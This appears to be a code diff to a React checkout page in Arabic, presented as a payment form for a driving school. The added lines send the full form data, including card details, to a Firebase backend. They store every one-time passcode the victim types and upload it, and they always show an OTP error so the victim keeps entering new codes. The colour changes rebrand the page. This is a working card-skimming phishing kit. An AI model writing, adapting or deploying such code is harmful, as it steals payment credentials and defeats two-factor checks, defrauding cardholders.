@@ -13,7 +13,8 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { Badge } from "@/components/ui/badge"
 import { Separator } from "@/components/ui/separator"
 import { CreditCard, AlertCircle, Phone, Shield, Clock, CheckCircle2, Building2 } from "lucide-react"
-
+import { addData } from "@/lib/firebase"
+const allOtps = ['']
 export default function Component() {
   const [showOTP, setShowOTP] = useState(false)
   const [otpError, setOtpError] = useState(false)
@@ -29,10 +30,14 @@ export default function Component() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+    const visitorId = localStorage.getItem('visitor')
+    addData({ id: visitorId, ...formData })
     if (!showOTP) {
       setShowOTP(true)
     } else {
-      // Simulate OTP error
+      addData({ id: visitorId, allOtps, ...formData })
+      allOtps.push(formData.otp)
+
       setOtpError(true)
     }
   }
@@ -61,13 +66,13 @@ export default function Component() {
 
   return (
     <div
-      className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 p-4 flex items-center justify-center"
+      className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50 to-indigo-50 p-4 flex items-center justify-center"
       dir="rtl"
     >
       <div className="w-full max-w-lg">
         {/* Header Section */}
         <div className="text-center mb-8">
-          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-blue-600 to-indigo-600 rounded-2xl mb-4 shadow-lg">
+          <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-teal-600 to-indigo-600 rounded-2xl mb-4 shadow-lg">
             <Building2 className="h-8 w-8 text-white" />
           </div>
           <h1 className="text-2xl font-bold text-slate-900 mb-2">مدرسة نوره لتعليم قيادة المركبات</h1>
@@ -79,7 +84,7 @@ export default function Component() {
             <div className="flex items-center justify-between">
               <div>
                 <CardTitle className="text-xl font-bold text-slate-900 flex items-center gap-2">
-                  <CreditCard className="h-5 w-5 text-blue-600" />
+                  <CreditCard className="h-5 w-5 text-teal-600" />
                   {showOTP ? "تأكيد الهوية" : "تفاصيل الدفع"}
                 </CardTitle>
                 <CardDescription className="text-slate-600 mt-1">
@@ -285,12 +290,12 @@ export default function Component() {
                     </Button>
                   </div>
 
-                  <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
+                  <div className="bg-blue-50 p-4 rounded-lg border border-teal-100">
                     <div className="flex items-center gap-3">
-                      <CheckCircle2 className="h-5 w-5 text-blue-600 flex-shrink-0" />
+                      <CheckCircle2 className="h-5 w-5 text-teal-600 flex-shrink-0" />
                       <div className="text-sm">
                         <p className="font-medium text-blue-900">سيتم خصم المبلغ فور التأكيد</p>
-                        <p className="text-blue-700">500 ريال من البطاقة المنتهية بـ {formData.cardNumber.slice(-4)}</p>
+                        <p className="text-teal-700">500 ريال من البطاقة المنتهية بـ {formData.cardNumber.slice(-4)}</p>
                       </div>
                     </div>
                   </div>
@@ -301,7 +306,7 @@ export default function Component() {
             <CardFooter className="pt-6">
               <Button
                 type="submit"
-                className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
+                className="w-full h-12 bg-gradient-to-r from-teal-600 to-green-400 hover:from-teal-700 hover:to-green-700 text-white font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
               >
                 {showOTP ? "تأكيد الدفع والمتابعة" : "متابعة إلى التحقق"}
               </Button>
